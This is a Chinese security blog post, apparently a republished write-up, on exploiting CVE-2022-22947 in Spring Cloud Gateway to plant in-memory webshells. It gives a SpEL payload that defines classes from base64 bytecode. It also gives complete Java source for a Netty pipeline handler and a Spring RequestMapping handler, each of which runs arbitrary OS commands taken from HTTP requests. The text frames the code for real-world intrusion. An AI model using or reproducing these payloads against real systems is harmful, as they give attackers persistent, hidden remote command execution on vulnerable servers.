0x00 背景
=======

最进小火的漏洞`CVE-2022-22947`虽然原理简单，但是实战利用还是有点小麻烦。目前公开的利用是每执行一条命就得注册一条路由，refresh一下网关，最后在访问这个路由。先不说步骤较多，就是频繁刷新会影响业务。实战当中注入一个内存马才是硬道理！

spring cloud gateway的web服务是netty+spring构建的，netty的web服务没有遵循servlet规范来设计。这也导致了构造它的内存马，与常规中间件有所不同，从某种程度来讲是这是一种新类型的内存马。

下面以vulhub中的`spring cloud gateway 3.1.0`作为环境，来分享下构造netty层和spring层的内存马，其他版本思路相同。

0x01 高可用Payload
===============

Spring cloud gateway对payload的稳定性要求比较高，一旦报错是由可能会影响业务的。所以在开始之前，我们需要先构造一个"优质"的SPEL执行java字节码的payload。

我主要对payload进行了如下的优化：

1. 解决BCEL/js引擎兼容性问题
2. 解决base64在不同版本jdk的兼容问题
3. 可多次运行同类名字节码
4. 解决可能导致的ClassNotFound问题

```php
#{T(org.springframework.cglib.core.ReflectUtils).defineClass('Memshell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAA....'),new javax.management.loading.MLet(new java.net.URL\[0\],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()}
```

0x02 netty层内存马
==============

netty处理http请求是构建一条责任链pipline,http请求会被链上的handler会依次来处理。所以我们的内存马其实就是一个handler。

不像常规的中间件，`filter/servlet/listener`组件有一个统一的维护对象。netty每一个请求过来，都是动态构造pipeline，pipeline上的handler都是在这个时候new的。**负责给pipeline添加handler是`ChannelPipelineConfigurer`(下面简称为configurer)，因此注入netty内存马的关键是分析`configurer`如何被netty管理和工作的。**

`CompositeChannelPipelineConfigurer#compositeChannelPipelineConfigurer`是为pipeline选择configurer的关键逻辑。第一个参数是Spring cloud gateway默认的configurer，第二个是用户额外配置的。一般情况下第一个参数是不为空配置，第二个参数为空配置，所以返回的configurer是Spring cloud gateway默认的。

如果我们能够设置第二个other参数不为空配置呢？ 那么这两个configurer将被合并为一个新`CompositeChannelPipelineConfigurer`。

```php
// reactor.netty.ReactorNetty.CompositeChannelPipelineConfigurer#compositeChannelPipelineConfigurer  
static ChannelPipelineConfigurer compositeChannelPipelineConfigurer(ChannelPipelineConfigurer configurer, ChannelPipelineConfigurer other) {  
    if (configurer \== ChannelPipelineConfigurer.emptyConfigurer()) { // 默认configurer是无操作空配置  
        return other;  
    } else if (other \== ChannelPipelineConfigurer.emptyConfigurer()) { // 其他额外configurer是无操作空配置  
        return configurer;  
    } else {  
        ......  
        ChannelPipelineConfigurer\[\] newConfigurers \= new ChannelPipelineConfigurer\[length\];  
        int pos;  
        if (thizConfigurers != null) {  
            pos \= thizConfigurers.length;  
            System.arraycopy(thizConfigurers, 0, newConfigurers, 0, pos);  
        } else {  
            pos \= 1;  
            newConfigurers\[0\] \= configurer;  // 将默认configurer存储到新configurer  
        }  
​  
        if (otherConfigurers != null) {  
            System.arraycopy(otherConfigurers, 0, newConfigurers, pos, otherConfigurers.length);  
        } else {  
            newConfigurers\[pos\] \= other; // 将其他额外configurer存储到新configurer  
        }  
        // 合并成新的configurer  
        return new ReactorNetty.CompositeChannelPipelineConfigurer(newConfigurers);  
    }  
}
```

`CompositeChannelPipelineConfigurer`会循环调用所有合并进来`configurer`来对`pipeline`添加`handler`。

```php
// reactor.netty.ReactorNetty.CompositeChannelPipelineConfigurer  
static final class CompositeChannelPipelineConfigurer implements ChannelPipelineConfigurer {  
        final ChannelPipelineConfigurer\[\] configurers;  
​  
        CompositeChannelPipelineConfigurer(ChannelPipelineConfigurer\[\] configurers) {  
            this.configurers \= configurers;  
        }  
​  
        public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, @Nullable SocketAddress remoteAddress) {  
            ChannelPipelineConfigurer\[\] var4 \= this.configurers;  
            int var5 \= var4.length;  
            // 循环调用所有configurer对pipeline设置handler  
            for(int var6 \= 0; var6 < var5; ++var6) {  
                ChannelPipelineConfigurer configurer \= var4\[var6\];  
                configurer.onChannelInit(connectionObserver, channel, remoteAddress);  
            }  
​  
        }  
}
```

因此我们可以通过修改other参数为自己的configurer向pipline中添加内存马。翻阅源码发现`reactor.netty.transport.TransportConfig`类的`doOnChannelInit`属性存储着other参数，我使用[java-object-searcher](https://github.com/c0ny1/java-object-searcher)以`doOnChannelInit`为关键字，定位出了它在线程对象的位置。

```php
TargetObject = {\[Ljava.lang.Thread;}   
   ---> \[3\] = {org.springframework.boot.web.embedded.netty.NettyWebServer$1} = {org.springframework.boot.web.embedded.netty.NettyWebServer$1}   
    ---> val$disposableServer = {reactor.netty.transport.ServerTransport$InetDisposableBind}   
     ---> config = {reactor.netty.http.server.HttpServerConfig}   
        ---> doOnChannelInit = {reactor.netty.ReactorNetty$$Lambda$391/236567414}
```

最终内存马构造如下：

```php
public class NettyMemshell extends ChannelDuplexHandler implements ChannelPipelineConfigurer {  
    public static String doInject(){  
        String msg \= "inject-start";  
        try {  
            Method getThreads \= Thread.class.getDeclaredMethod("getThreads");  
            getThreads.setAccessible(true);  
            Object threads \= getThreads.invoke(null);  
​  
            for (int i \= 0; i < Array.getLength(threads); i++) {  
                Object thread \= Array.get(threads, i);  
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {  
                    Field \_val$disposableServer \= thread.getClass().getDeclaredField("val$disposableServer");  
                    \_val$disposableServer.setAccessible(true);  
                    Object val$disposableServer \= \_val$disposableServer.get(thread);  
                    Field \_config \= val$disposableServer.getClass().getSuperclass().getDeclaredField("config");  
                    \_config.setAccessible(true);  
                    Object config \= \_config.get(val$disposableServer);  
                    Field \_doOnChannelInit \= config.getClass().getSuperclass().getSuperclass().getDeclaredField("doOnChannelInit");  
                    \_doOnChannelInit.setAccessible(true);  
                    \_doOnChannelInit.set(config, new NettyMemshell());  
                    msg \= "inject-success";  
                }  
            }  
        }catch (Exception e){  
            msg \= "inject-error";  
        }  
        return msg;  
    }  

    @Override  
    // Step1. 作为一个ChannelPipelineConfigurer给pipline注册Handler  
    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress) {  
        ChannelPipeline pipeline \= channel.pipeline();  
        // 将内存马的handler添加到spring层handler的前面          
        pipeline.addBefore("reactor.left.httpTrafficHandler","memshell\_handler",new NettyMemshell());  
    }  
      
      
    @Override  
    // Step2. 作为Handler处理请求，在此实现内存马的功能逻辑  
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {  
        if(msg instanceof HttpRequest){  
            HttpRequest httpRequest \= (HttpRequest)msg;  
            try {  
                if(httpRequest.headers().contains("X-CMD")) {  
                    String cmd \= httpRequest.headers().get("X-CMD");  
                    String execResult \= new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A").next();  
                    // 返回执行结果  
                    send(ctx, execResult, HttpResponseStatus.OK);  
                    return;  
                }  
            }catch (Exception e){  
                e.printStackTrace();  
            }  
        }  
        ctx.fireChannelRead(msg);  
    }  
​  
​  
    private void send(ChannelHandlerContext ctx, String context, HttpResponseStatus status) {  
        FullHttpResponse response \= new DefaultFullHttpResponse(HttpVersion.HTTP\_1\_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF\_8));  
        response.headers().set(HttpHeaderNames.CONTENT\_TYPE, "text/plain; charset=UTF-8");  
        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);  
    }  
}
```

![netty内存马执行效果](https://shs3.b.qianxin.com/butian_public/f148850e27e1c9f5729c4962baa34a6a5964b183a2111.jpg)

0x03 Spring层内存马
===============

Spring层request请求处理组件很多，有handler/Adapter/Filter等等，理论上都可以拿来做内存马，这里我分享下最简单的`RequestMappingHandler`。

Spring cloud gateway主要的路由分发主要由`org.springframework.web.reactive.DispatcherHandler`类和它三个组件来完成

1. org.springframework.web.reactive.HandlerMapping 路由比配器
2. org.springframework.web.reactive.HandlerAdapter handler适配器
3. org.springframework.web.reactive.HandlerResultHandler 结果处理器

具体逻辑如下：

```php
// org.springframework.web.reactive.DispatcherHandler#handle  
public Mono<Void\> handle(ServerWebExchange exchange) {  
    return this.handlerMappings \== null ? this.createNotFoundError() : Flux.fromIterable(this.handlerMappings).concatMap((mapping) \-> {  
        return mapping.getHandler(exchange); // Step1. 使用HandlerMapping匹配路由  
    }).next().switchIfEmpty(this.createNotFoundError()).flatMap((handler) \-> {  
        return this.invokeHandler(exchange, handler); // Step2. 使用具体HandlerAdapter来处理具体请求  
    }).flatMap((result) \-> {  
        return this.handleResult(exchange, result); // Step3. 使用适合的HandlerResultHandler来处理返回的结果  
    });  
}
```

基于这个流程，我们可以梳理出一个构造内存马的思路。让`HandlerMapping`注册一个映射关系，通过映射关系让特定的HandlerAdapter执行到我们的内存马流程，最后内存马返回一个HandlerResultHandler可以处理的结果类型即可。

这里我选择`RequestMappingHandlerMapping`这个HandlerMapping，来注册一个与使用`@RequestMapping("/*")`等效的内存马。

![RequestMappingHandlerMapping](https://shs3.b.qianxin.com/butian_public/f874927b01ed1b4678f76e4d5fd20f8e1ba39ca6b503c.jpg)

```php
public class SpringRequestMappingMemshell {  
    public static String doInject(Object requestMappingHandlerMapping) {  
        String msg \= "inject-start";  
        try {  
            Method registerHandlerMethod \= requestMappingHandlerMapping.getClass().getDeclaredMethod("registerHandlerMethod", Object.class, Method.class, RequestMappingInfo.class);  
            registerHandlerMethod.setAccessible(true);  
            Method executeCommand \= SpringRequestMappingMemshell.class.getDeclaredMethod("executeCommand", String.class);  
            PathPattern pathPattern \= new PathPatternParser().parse("/\*");  
            PatternsRequestCondition patternsRequestCondition \= new PatternsRequestCondition(pathPattern);  
            RequestMappingInfo requestMappingInfo \= new RequestMappingInfo("", patternsRequestCondition, null, null, null, null, null, null);  
            registerHandlerMethod.invoke(requestMappingHandlerMapping, new SpringRequestMappingMemshell(), executeCommand, requestMappingInfo);  
            msg \= "inject-success";  
        }catch (Exception e){  
            msg \= "inject-error";  
        }  
        return msg;  
    }  
​  
    public ResponseEntity executeCommand(String cmd) throws IOException {  
        String execResult \= new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A").next();  
        return new ResponseEntity(execResult, HttpStatus.OK);  
    }  
}
```

那怎么获取到`RequestMappingHandlerMapping`呢？通过java-object-searcher自然可以定位到，小组的`@whw1sfb`师傅提到了一种更简便的方案，**从SPEL上下文的bean当中获取！**

![从Bean中获取RequestMappingHandlerMapping](https://shs3.b.qianxin.com/butian_public/f507789e75ebea00be5849ffd39186b398e95670ca0fd.jpg)

![注册Spring requestmapping内存马](https://shs3.b.qianxin.com/butian_public/f415938984b3f0e19852b6b0edda339d79cfcc06d6c1c.jpg)

![Spring RequestMapping内存马](https://shs3.b.qianxin.com/butian_public/f586258b645103ebbb1e3febce3d6018dc8a41051d532.jpg)

0x04 总结
=======

从最后的效果来看，spring层的内存马更好做兼容性，因为可以直接从bean当中获取目标对象，唯一要考虑的就是注入方法在各个版本是否兼容。

关于各个协议和组件的内存马的构造思路其实都大同小异，说白了就是分析涉及处理请求的对象，阅读它的源码看看是否能获取请求内容，同时能否控制响应内容。然后分析该对象是如何被注册到内存当中的，最后我们只要模拟下这个过程即可。

0x05 参考资料
=========

- [CVE-2022-22947: SpEL Casting and Evil Beans](https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/)

文章授权转载于回忆飘如雪